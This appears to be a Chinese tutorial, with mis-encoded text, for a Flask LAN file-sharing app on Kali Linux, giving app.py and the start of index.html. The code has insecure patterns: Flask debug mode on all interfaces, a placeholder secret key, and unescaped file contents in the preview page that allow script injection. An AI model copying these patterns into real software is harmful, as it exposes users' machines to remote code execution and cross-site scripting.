[{"content":"åŸºç¡€ç¯å¢ƒæ­å»º ç›®å½• kali linuxå†…ç½‘æ–‡ä»¶å…±äº«ç³»ç»Ÿæ­å»º é¡¹ç›®ç»“æ„ å®‰è£…Flask app.py index.html start.sh stop.sh kali linuxå†…ç½‘æ–‡ä»¶å…±äº«ç³»ç»Ÿæ­å»º é¡¹ç›®ç»“æ„ 1 2 3 4 5 6 7 8 FileShare/ â”œâ”€â”€ app.py # ä¸»ç¨‹åº â”œâ”€â”€ uploads/ # ä¸Šä¼ æ–‡ä»¶å­˜å‚¨ç›®å½• â”œâ”€â”€ downloads/ # ä¸‹è½½æ–‡ä»¶å­˜å‚¨ç›®å½• â””â”€â”€ templates/ â”‚ â””â”€â”€ index.html # ç½‘é¡µæ¨¡æ¿ â”œâ”€â”€ start.sh # å¯åŠ¨è„šæœ¬ â””â”€â”€ stop.sh # ç»“æŸè„šæœ¬ å®‰è£…Flask 1 2 â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop] â””â”€$ sudo apt install python3-flask app.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 396 397 398 399 400 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 #!/usr/bin/env python3 from flask import Flask, render_template, request, send_from_directory, jsonify, redirect, url_for import os from werkzeug.utils import secure_filename import json from datetime import datetime import mimetypes app = Flask(__name__) # é…ç½® app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;] = os.path.join(os.path.dirname(os.path.abspath(__file__)), \u0026#39;uploads\u0026#39;) app.config[\u0026#39;DOWNLOAD_FOLDER\u0026#39;] = os.path.join(os.path.dirname(os.path.abspath(__file__)), \u0026#39;downloads\u0026#39;) app.config[\u0026#39;MAX_CONTENT_LENGTH\u0026#39;] = 2 * 1024 * 1024 * 1024 # 2GB æ–‡ä»¶å¤§å°é™åˆ¶ app.config[\u0026#39;SECRET_KEY\u0026#39;] = \u0026#39;your-secret-key-change-this-in-production\u0026#39; # æ”¯æŒæ‰€æœ‰æ–‡ä»¶ç±»å‹ï¼Œä½†å¯ä»¥è®¾ç½®ä¸€äº›å±é™©ç±»å‹çš„é»‘åå• app.config[\u0026#39;DANGEROUS_EXTENSIONS\u0026#39;] = { \u0026#39;exe\u0026#39;, \u0026#39;msi\u0026#39;, \u0026#39;bat\u0026#39;, \u0026#39;cmd\u0026#39;, \u0026#39;sh\u0026#39;, \u0026#39;bin\u0026#39;, \u0026#39;dmg\u0026#39;, \u0026#39;pkg\u0026#39;, \u0026#39;app\u0026#39;, \u0026#39;jar\u0026#39;, \u0026#39;js\u0026#39;, \u0026#39;vbs\u0026#39;, \u0026#39;ps1\u0026#39;, \u0026#39;py\u0026#39;, \u0026#39;php\u0026#39;, \u0026#39;pl\u0026#39;, \u0026#39;cgi\u0026#39;, \u0026#39;sh\u0026#39;, \u0026#39;bash\u0026#39; } # ç¡®ä¿ç›®å½•å­˜åœ¨ for folder in [app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], app.config[\u0026#39;DOWNLOAD_FOLDER\u0026#39;]]: os.makedirs(folder, exist_ok=True) def is_dangerous_file(filename): \u0026#34;\u0026#34;\u0026#34;æ£€æŸ¥æ–‡ä»¶æ˜¯å¦ä¸ºæ½œåœ¨å±é™©ç±»å‹\u0026#34;\u0026#34;\u0026#34; if \u0026#39;.\u0026#39; not in filename: return False ext = filename.rsplit(\u0026#39;.\u0026#39;, 1)[1].lower() return ext in app.config[\u0026#39;DANGEROUS_EXTENSIONS\u0026#39;] def get_file_info(path): \u0026#34;\u0026#34;\u0026#34;è·å–æ–‡ä»¶ä¿¡æ¯\u0026#34;\u0026#34;\u0026#34; try: stats = os.stat(path) file_info = { \u0026#39;size\u0026#39;: stats.st_size, \u0026#39;modified\u0026#39;: datetime.fromtimestamp(stats.st_mtime).strftime(\u0026#39;%Y-%m-%d %H:%M:%S\u0026#39;), \u0026#39;created\u0026#39;: datetime.fromtimestamp(stats.st_ctime).strftime(\u0026#39;%Y-%m-%d %H:%M:%S\u0026#39;) } # æ·»åŠ æ–‡ä»¶ç±»å‹ä¿¡æ¯ mime_type, _ = mimetypes.guess_type(path) if mime_type: file_info[\u0026#39;type\u0026#39;] = mime_type else: # æ ¹æ®æ‰©å±•ååˆ¤æ–­ ext = os.path.splitext(path)[1].lower().lstrip(\u0026#39;.\u0026#39;) common_types = { \u0026#39;zip\u0026#39;: \u0026#39;application/zip\u0026#39;, \u0026#39;rar\u0026#39;: \u0026#39;application/x-rar-compressed\u0026#39;, \u0026#39;7z\u0026#39;: \u0026#39;application/x-7z-compressed\u0026#39;, \u0026#39;tar\u0026#39;: \u0026#39;application/x-tar\u0026#39;, \u0026#39;gz\u0026#39;: \u0026#39;application/gzip\u0026#39;, \u0026#39;bz2\u0026#39;: \u0026#39;application/x-bzip2\u0026#39;, \u0026#39;xz\u0026#39;: \u0026#39;application/x-xz\u0026#39;, \u0026#39;pdf\u0026#39;: \u0026#39;application/pdf\u0026#39;, \u0026#39;doc\u0026#39;: \u0026#39;application/msword\u0026#39;, \u0026#39;docx\u0026#39;: \u0026#39;application/vnd.openxmlformats-officedocument.wordprocessingml.document\u0026#39;, \u0026#39;xls\u0026#39;: \u0026#39;application/vnd.ms-excel\u0026#39;, \u0026#39;xlsx\u0026#39;: \u0026#39;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet\u0026#39;, \u0026#39;ppt\u0026#39;: \u0026#39;application/vnd.ms-powerpoint\u0026#39;, \u0026#39;pptx\u0026#39;: \u0026#39;application/vnd.openxmlformats-officedocument.presentationml.presentation\u0026#39;, \u0026#39;mp4\u0026#39;: \u0026#39;video/mp4\u0026#39;, \u0026#39;avi\u0026#39;: \u0026#39;video/x-msvideo\u0026#39;, \u0026#39;mkv\u0026#39;: \u0026#39;video/x-matroska\u0026#39;, \u0026#39;mp3\u0026#39;: \u0026#39;audio/mpeg\u0026#39;, \u0026#39;wav\u0026#39;: \u0026#39;audio/wav\u0026#39;, \u0026#39;flac\u0026#39;: \u0026#39;audio/flac\u0026#39;, \u0026#39;jpg\u0026#39;: \u0026#39;image/jpeg\u0026#39;, \u0026#39;jpeg\u0026#39;: \u0026#39;image/jpeg\u0026#39;, \u0026#39;png\u0026#39;: \u0026#39;image/png\u0026#39;, \u0026#39;gif\u0026#39;: \u0026#39;image/gif\u0026#39;, \u0026#39;bmp\u0026#39;: \u0026#39;image/bmp\u0026#39;, \u0026#39;txt\u0026#39;: \u0026#39;text/plain\u0026#39;, \u0026#39;py\u0026#39;: \u0026#39;text/x-python\u0026#39;, \u0026#39;js\u0026#39;: \u0026#39;application/javascript\u0026#39;, \u0026#39;html\u0026#39;: \u0026#39;text/html\u0026#39;, \u0026#39;css\u0026#39;: \u0026#39;text/css\u0026#39;, \u0026#39;json\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;xml\u0026#39;: \u0026#39;application/xml\u0026#39; } file_info[\u0026#39;type\u0026#39;] = common_types.get(ext, \u0026#39;application/octet-stream\u0026#39;) return file_info except Exception as e: return {\u0026#39;size\u0026#39;: 0, \u0026#39;modified\u0026#39;: \u0026#39;Unknown\u0026#39;, \u0026#39;created\u0026#39;: \u0026#39;Unknown\u0026#39;, \u0026#39;type\u0026#39;: \u0026#39;Unknown\u0026#39;} def get_readable_size(size_in_bytes): \u0026#34;\u0026#34;\u0026#34;å°†å­—èŠ‚è½¬æ¢ä¸ºå¯è¯»çš„å¤§å°\u0026#34;\u0026#34;\u0026#34; for unit in [\u0026#39;B\u0026#39;, \u0026#39;KB\u0026#39;, \u0026#39;MB\u0026#39;, \u0026#39;GB\u0026#39;, \u0026#39;TB\u0026#39;]: if size_in_bytes \u0026lt; 1024.0: return f\u0026#34;{size_in_bytes:.2f} {unit}\u0026#34; size_in_bytes /= 1024.0 return f\u0026#34;{size_in_bytes:.2f} PB\u0026#34; def is_safe_filename(filename): \u0026#34;\u0026#34;\u0026#34;æ£€æŸ¥æ–‡ä»¶åæ˜¯å¦å®‰å…¨\u0026#34;\u0026#34;\u0026#34; # é˜²æ­¢è·¯å¾„éå†æ”»å‡» forbidden_patterns = [\u0026#39;..\u0026#39;, \u0026#39;/\u0026#39;, \u0026#39;\\\\\u0026#39;] for pattern in forbidden_patterns: if pattern in filename: return False return True @app.route(\u0026#39;/\u0026#39;) def index(): \u0026#34;\u0026#34;\u0026#34;ä¸»é¡µ\u0026#34;\u0026#34;\u0026#34; try: # è·å–ä¸Šä¼ æ–‡ä»¶åˆ—è¡¨ upload_files = [] for filename in sorted(os.listdir(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;]), key=lambda x: os.path.getmtime(os.path.join(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], x)), reverse=True): filepath = os.path.join(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], filename) if os.path.isfile(filepath): info = get_file_info(filepath) upload_files.append({ \u0026#39;name\u0026#39;: filename, \u0026#39;safe\u0026#39;: not is_dangerous_file(filename), **info }) # è·å–ä¸‹è½½æ–‡ä»¶åˆ—è¡¨ download_files = [] for filename in sorted(os.listdir(app.config[\u0026#39;DOWNLOAD_FOLDER\u0026#39;]), key=lambda x: os.path.getmtime(os.path.join(app.config[\u0026#39;DOWNLOAD_FOLDER\u0026#39;], x)), reverse=True): filepath = os.path.join(app.config[\u0026#39;DOWNLOAD_FOLDER\u0026#39;], filename) if os.path.isfile(filepath): info = get_file_info(filepath) download_files.append({ \u0026#39;name\u0026#39;: filename, \u0026#39;safe\u0026#39;: not is_dangerous_file(filename), **info }) return render_template(\u0026#39;index.html\u0026#39;, upload_files=upload_files, download_files=download_files, upload_folder=app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], download_folder=app.config[\u0026#39;DOWNLOAD_FOLDER\u0026#39;], get_readable_size=get_readable_size) except Exception as e: return f\u0026#34;Error loading page: {str(e)}\u0026#34;, 500 @app.route(\u0026#39;/upload\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def upload_file(): \u0026#34;\u0026#34;\u0026#34;å¤„ç†æ–‡ä»¶ä¸Šä¼ \u0026#34;\u0026#34;\u0026#34; try: # æ£€æŸ¥æ˜¯å¦æœ‰æ–‡ä»¶ if \u0026#39;file\u0026#39; not in request.files: return jsonify({\u0026#39;error\u0026#39;: \u0026#39;æ²¡æœ‰é€‰æ‹©æ–‡ä»¶\u0026#39;}), 400 file = request.files[\u0026#39;file\u0026#39;] # å¦‚æœæ²¡æœ‰é€‰æ‹©æ–‡ä»¶ if file.filename == \u0026#39;\u0026#39;: return jsonify({\u0026#39;error\u0026#39;: \u0026#39;æ²¡æœ‰é€‰æ‹©æ–‡ä»¶\u0026#39;}), 400 # æ£€æŸ¥æ–‡ä»¶åå®‰å…¨æ€§ if not is_safe_filename(file.filename): return jsonify({\u0026#39;error\u0026#39;: \u0026#39;æ–‡ä»¶åä¸å®‰å…¨ï¼ŒåŒ…å«éæ³•å­—ç¬¦\u0026#39;}), 400 # å®‰å…¨å¤„ç†æ–‡ä»¶å filename = secure_filename(file.filename) if not filename: filename = \u0026#39;uploaded_file\u0026#39; # å¤„ç†æ— æ‰©å±•åçš„æƒ…å†µ if \u0026#39;.\u0026#39; not in filename: # å°è¯•ä»Content-Typeæ¨æ–­æ‰©å±•å content_type = file.content_type if content_type: ext = mimetypes.guess_extension(content_type) if ext: filename = filename + ext # é¿å…æ–‡ä»¶åå†²çª base, extension = os.path.splitext(filename) counter = 1 original_filename = filename while os.path.exists(os.path.join(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], filename)): filename = f\u0026#34;{base}_{counter}{extension}\u0026#34; counter += 1 # ä¿å­˜æ–‡ä»¶ file_path = os.path.join(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], filename) file.save(file_path) # è·å–æ–‡ä»¶ä¿¡æ¯ info = get_file_info(file_path) return jsonify({ \u0026#39;success\u0026#39;: True, \u0026#39;filename\u0026#39;: filename, \u0026#39;original_filename\u0026#39;: original_filename, \u0026#39;message\u0026#39;: \u0026#39;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ\u0026#39;, \u0026#39;info\u0026#39;: info, \u0026#39;is_dangerous\u0026#39;: is_dangerous_file(filename), \u0026#39;warning\u0026#39;: \u0026#39;è­¦å‘Šï¼šæ­¤æ–‡ä»¶ç±»å‹å¯èƒ½å­˜åœ¨å®‰å…¨é£é™©\u0026#39; if is_dangerous_file(filename) else None }) except Exception as e: return jsonify({\u0026#39;error\u0026#39;: f\u0026#39;ä¸Šä¼ å¤±è´¥: {str(e)}\u0026#39;}), 500 @app.route(\u0026#39;/download/\u0026lt;path:filename\u0026gt;\u0026#39;) def download_file(filename): \u0026#34;\u0026#34;\u0026#34;ä¸‹è½½æ–‡ä»¶\u0026#34;\u0026#34;\u0026#34; try: # å®‰å…¨éªŒè¯ if not is_safe_filename(filename): return \u0026#34;æ–‡ä»¶åä¸å®‰å…¨\u0026#34;, 400 filepath = os.path.join(app.config[\u0026#39;DOWNLOAD_FOLDER\u0026#39;], filename) if not os.path.exists(filepath): return \u0026#34;æ–‡ä»¶ä¸å­˜åœ¨\u0026#34;, 404 # è®¾ç½®ä¸‹è½½æ—¶æ˜¾ç¤ºåŸå§‹æ–‡ä»¶å as_attachment = True download_filename = filename # å¯¹äºæŸäº›æ–‡ä»¶ç±»å‹ï¼Œå¯ä»¥åœ¨æµè§ˆå™¨ä¸­é¢„è§ˆ preview_extensions = {\u0026#39;.pdf\u0026#39;, \u0026#39;.jpg\u0026#39;, \u0026#39;.jpeg\u0026#39;, \u0026#39;.png\u0026#39;, \u0026#39;.gif\u0026#39;, \u0026#39;.txt\u0026#39;, \u0026#39;.html\u0026#39;, \u0026#39;.css\u0026#39;, \u0026#39;.js\u0026#39;, \u0026#39;.json\u0026#39;, \u0026#39;.xml\u0026#39;} if any(filename.lower().endswith(ext) for ext in preview_extensions): as_attachment = False return send_from_directory(app.config[\u0026#39;DOWNLOAD_FOLDER\u0026#39;], filename, as_attachment=as_attachment, download_name=download_filename) except Exception as e: return f\u0026#34;ä¸‹è½½å¤±è´¥: {str(e)}\u0026#34;, 500 @app.route(\u0026#39;/preview/\u0026lt;path:filename\u0026gt;\u0026#39;) def preview_file(filename): \u0026#34;\u0026#34;\u0026#34;é¢„è§ˆæ–‡ä»¶ï¼ˆä»…é€‚ç”¨äºæ–‡æœ¬å’Œå›¾ç‰‡ï¼‰\u0026#34;\u0026#34;\u0026#34; try: if not is_safe_filename(filename): return \u0026#34;æ–‡ä»¶åä¸å®‰å…¨\u0026#34;, 400 filepath = os.path.join(app.config[\u0026#39;DOWNLOAD_FOLDER\u0026#39;], filename) if not os.path.exists(filepath): return \u0026#34;æ–‡ä»¶ä¸å­˜åœ¨\u0026#34;, 404 # æ£€æŸ¥æ–‡ä»¶å¤§å°ï¼ˆé™åˆ¶é¢„è§ˆå¤§å°ï¼‰ if os.path.getsize(filepath) \u0026gt; 10 * 1024 * 1024: # 10MB return \u0026#34;æ–‡ä»¶å¤ªå¤§ï¼Œæ— æ³•é¢„è§ˆ\u0026#34;, 400 # æ ¹æ®æ–‡ä»¶ç±»å‹è¿”å›ä¸åŒçš„é¢„è§ˆ mime_type, encoding = mimetypes.guess_type(filepath) if mime_type: if mime_type.startswith(\u0026#39;image/\u0026#39;): # å›¾ç‰‡æ–‡ä»¶ç›´æ¥è¿”å› return send_from_directory(app.config[\u0026#39;DOWNLOAD_FOLDER\u0026#39;], filename) elif mime_type.startswith(\u0026#39;text/\u0026#39;): # æ–‡æœ¬æ–‡ä»¶è¯»å–å†…å®¹ with open(filepath, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;, errors=\u0026#39;ignore\u0026#39;) as f: content = f.read() return f\u0026#39;\u0026lt;pre style=\u0026#34;white-space: pre-wrap; word-wrap: break-word;\u0026#34;\u0026gt;{content}\u0026lt;/pre\u0026gt;\u0026#39; elif mime_type == \u0026#39;application/pdf\u0026#39;: # PDFæ–‡ä»¶åµŒå…¥æ˜¾ç¤º return f\u0026#39;\u0026#39;\u0026#39; \u0026lt;iframe src=\u0026#34;/download/{filename}\u0026#34; width=\u0026#34;100%\u0026#34; height=\u0026#34;800px\u0026#34;\u0026gt; æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒPDFé¢„è§ˆï¼Œè¯·\u0026lt;a href=\u0026#34;/download/{filename}\u0026#34;\u0026gt;ä¸‹è½½\u0026lt;/a\u0026gt;æŸ¥çœ‹ \u0026lt;/iframe\u0026gt; \u0026#39;\u0026#39;\u0026#39; return f\u0026#34;ä¸æ”¯æŒé¢„è§ˆæ­¤æ–‡ä»¶ç±»å‹ï¼Œè¯·\u0026lt;a href=\u0026#39;/download/{filename}\u0026#39;\u0026gt;ä¸‹è½½\u0026lt;/a\u0026gt;æŸ¥çœ‹\u0026#34; except Exception as e: return f\u0026#34;é¢„è§ˆå¤±è´¥: {str(e)}\u0026#34;, 500 @app.route(\u0026#39;/delete_upload/\u0026lt;path:filename\u0026gt;\u0026#39;, methods=[\u0026#39;DELETE\u0026#39;]) def delete_upload_file(filename): \u0026#34;\u0026#34;\u0026#34;åˆ é™¤ä¸Šä¼ çš„æ–‡ä»¶\u0026#34;\u0026#34;\u0026#34; try: if not is_safe_filename(filename): return jsonify({\u0026#39;error\u0026#39;: \u0026#39;æ–‡ä»¶åä¸å®‰å…¨\u0026#39;}), 400 filepath = os.path.join(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], filename) if os.path.exists(filepath): os.remove(filepath) return jsonify({\u0026#39;success\u0026#39;: True, \u0026#39;message\u0026#39;: \u0026#39;æ–‡ä»¶å·²åˆ é™¤\u0026#39;}) return jsonify({\u0026#39;error\u0026#39;: \u0026#39;æ–‡ä»¶ä¸å­˜åœ¨\u0026#39;}), 404 except Exception as e: return jsonify({\u0026#39;error\u0026#39;: str(e)}), 500 @app.route(\u0026#39;/delete_download/\u0026lt;path:filename\u0026gt;\u0026#39;, methods=[\u0026#39;DELETE\u0026#39;]) def delete_download_file(filename): \u0026#34;\u0026#34;\u0026#34;åˆ é™¤ä¸‹è½½çš„æ–‡ä»¶\u0026#34;\u0026#34;\u0026#34; try: if not is_safe_filename(filename): return jsonify({\u0026#39;error\u0026#39;: \u0026#39;æ–‡ä»¶åä¸å®‰å…¨\u0026#39;}), 400 filepath = os.path.join(app.config[\u0026#39;DOWNLOAD_FOLDER\u0026#39;], filename) if os.path.exists(filepath): os.remove(filepath) return jsonify({\u0026#39;success\u0026#39;: True, \u0026#39;message\u0026#39;: \u0026#39;æ–‡ä»¶å·²åˆ é™¤\u0026#39;}) return jsonify({\u0026#39;error\u0026#39;: \u0026#39;æ–‡ä»¶ä¸å­˜åœ¨\u0026#39;}), 404 except Exception as e: return jsonify({\u0026#39;error\u0026#39;: str(e)}), 500 @app.route(\u0026#39;/get_file_list\u0026#39;) def get_file_list(): \u0026#34;\u0026#34;\u0026#34;è·å–æ–‡ä»¶åˆ—è¡¨ï¼ˆJSONæ ¼å¼ï¼‰\u0026#34;\u0026#34;\u0026#34; try: files = [] for filename in sorted(os.listdir(app.config[\u0026#39;DOWNLOAD_FOLDER\u0026#39;]), key=lambda x: os.path.getmtime(os.path.join(app.config[\u0026#39;DOWNLOAD_FOLDER\u0026#39;], x)), reverse=True): filepath = os.path.join(app.config[\u0026#39;DOWNLOAD_FOLDER\u0026#39;], filename) if os.path.isfile(filepath): info = get_file_info(filepath) files.append({ \u0026#39;name\u0026#39;: filename, \u0026#39;safe\u0026#39;: not is_dangerous_file(filename), **info }) return jsonify({\u0026#39;files\u0026#39;: files}) except Exception as e: return jsonify({\u0026#39;error\u0026#39;: str(e)}), 500 @app.route(\u0026#39;/get_upload_list\u0026#39;) def get_upload_list(): \u0026#34;\u0026#34;\u0026#34;è·å–ä¸Šä¼ æ–‡ä»¶åˆ—è¡¨ï¼ˆJSONæ ¼å¼ï¼‰\u0026#34;\u0026#34;\u0026#34; try: files = [] for filename in sorted(os.listdir(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;]), key=lambda x: os.path.getmtime(os.path.join(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], x)), reverse=True): filepath = os.path.join(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], filename) if os.path.isfile(filepath): info = get_file_info(filepath) files.append({ \u0026#39;name\u0026#39;: filename, \u0026#39;safe\u0026#39;: not is_dangerous_file(filename), **info }) return jsonify({\u0026#39;files\u0026#39;: files}) except Exception as e: return jsonify({\u0026#39;error\u0026#39;: str(e)}), 500 @app.route(\u0026#39;/clean_uploads\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def clean_uploads(): \u0026#34;\u0026#34;\u0026#34;æ¸…ç†æ‰€æœ‰ä¸Šä¼ çš„æ–‡ä»¶\u0026#34;\u0026#34;\u0026#34; try: count = 0 total_size = 0 for filename in os.listdir(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;]): filepath = os.path.join(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], filename) if os.path.isfile(filepath): total_size += os.path.getsize(filepath) os.remove(filepath) count += 1 return jsonify({ \u0026#39;success\u0026#39;: True, \u0026#39;message\u0026#39;: f\u0026#39;å·²æ¸…ç† {count} ä¸ªæ–‡ä»¶ï¼Œé‡Šæ”¾ {get_readable_size(total_size)}\u0026#39;, \u0026#39;count\u0026#39;: count, \u0026#39;total_size\u0026#39;: total_size }) except Exception as e: return jsonify({\u0026#39;error\u0026#39;: str(e)}), 500 @app.route(\u0026#39;/create_folder\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def create_folder(): \u0026#34;\u0026#34;\u0026#34;åœ¨ä¸‹è½½ç›®å½•åˆ›å»ºæ–‡ä»¶å¤¹\u0026#34;\u0026#34;\u0026#34; try: data = request.get_json() folder_name = data.get(\u0026#39;folder_name\u0026#39;, \u0026#39;\u0026#39;).strip() if not folder_name: return jsonify({\u0026#39;error\u0026#39;: \u0026#39;æ–‡ä»¶å¤¹åä¸èƒ½ä¸ºç©º\u0026#39;}), 400 # å®‰å…¨æ£€æŸ¥ if not is_safe_filename(folder_name): return jsonify({\u0026#39;error\u0026#39;: \u0026#39;æ–‡ä»¶å¤¹åä¸å®‰å…¨\u0026#39;}), 400 folder_path = os.path.join(app.config[\u0026#39;DOWNLOAD_FOLDER\u0026#39;], folder_name) if os.path.exists(folder_path): return jsonify({\u0026#39;error\u0026#39;: \u0026#39;æ–‡ä»¶å¤¹å·²å­˜åœ¨\u0026#39;}), 400 os.makedirs(folder_path, exist_ok=True) return jsonify({\u0026#39;success\u0026#39;: True, \u0026#39;message\u0026#39;: f\u0026#39;æ–‡ä»¶å¤¹ \u0026#34;{folder_name}\u0026#34; åˆ›å»ºæˆåŠŸ\u0026#39;}) except Exception as e: return jsonify({\u0026#39;error\u0026#39;: str(e)}), 500 if __name__ == \u0026#39;__main__\u0026#39;: # åˆå§‹åŒ–mimetypes mimetypes.init() # è·å–æœ¬æœºIP import socket try: hostname = socket.gethostname() local_ip = socket.gethostbyname(hostname) except: local_ip = \u0026#39;127.0.0.1\u0026#39; print(\u0026#34;=\u0026#34; * 60) print(\u0026#34;å†…ç½‘æ–‡ä»¶å…±äº«ç³»ç»Ÿ\u0026#34;) print(\u0026#34;=\u0026#34; * 60) print(f\u0026#34;ğŸ“ ä¸Šä¼ ç›®å½•: {app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;]}\u0026#34;) print(f\u0026#34;ğŸ“ ä¸‹è½½ç›®å½•: {app.config[\u0026#39;DOWNLOAD_FOLDER\u0026#39;]}\u0026#34;) print(f\u0026#34;ğŸŒ æœ¬åœ°è®¿é—®: http://127.0.0.1:10000\u0026#34;) print(f\u0026#34;ğŸŒ å±€åŸŸç½‘è®¿é—®: http://{local_ip}:10000\u0026#34;) print(f\u0026#34;ğŸ’¾ æ”¯æŒæ–‡ä»¶å¤§å°: æœ€å¤§ {app.config[\u0026#39;MAX_CONTENT_LENGTH\u0026#39;] // (1024*1024*1024)}GB\u0026#34;) print(f\u0026#34;âš ï¸ å±é™©æ–‡ä»¶ç±»å‹: {\u0026#39;, \u0026#39;.join(sorted(app.config[\u0026#39;DANGEROUS_EXTENSIONS\u0026#39;]))}\u0026#34;) print(\u0026#34;=\u0026#34; * 60) # æ£€æŸ¥æ˜¯å¦éœ€è¦åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ try: import flask except ImportError: print(\u0026#34;âŒ Flaskæœªå®‰è£…ï¼Œè¯·è¿è¡Œä»¥ä¸‹å‘½ä»¤:\u0026#34;) print(\u0026#34; 1. python3 -m venv venv\u0026#34;) print(\u0026#34; 2. source venv/bin/activate\u0026#34;) print(\u0026#34; 3. pip install flask\u0026#34;) exit(1) # å¯åŠ¨æœåŠ¡å™¨ app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000, debug=True, threaded=True) index.html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 396 397 398 399 400 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 450 451 452 453 454 455 456 457 458 459 460 461 462 463 464 465 466 467 468 469 470 471 472 473 474 475 476 477 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 493 494 495 496 497 498 499 500 501 502 503 504 505 506 507 508 509 510 511 512 513 514 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 531 532 533 534 535 536 537 538 539 540 541 542 543 544 545 546 547 548 549 550 551 552 553 554 555 556 557 558 559 560 561 562 563 564 565 566 567 568 569 570 571 572 573 574 575 576 577 578 579 580 581 582 583 584 585 586 587 588 589 590 591 592 593 594 595 596 597 598 599 600 601 602 603 604 605 606 607 608 609 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;å†…ç½‘æ–‡ä»¶å…±äº«ç³»ç»Ÿ\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; * { margin: 0; padding: 0; box-sizing: border-box; } body { font-family: \u0026#39;Microsoft YaHei\u0026#39;, Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; } .container { max-width: 1600px; margin: 0 auto; background: white; border-radius: 15px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); overflow: hidden; } header { background: 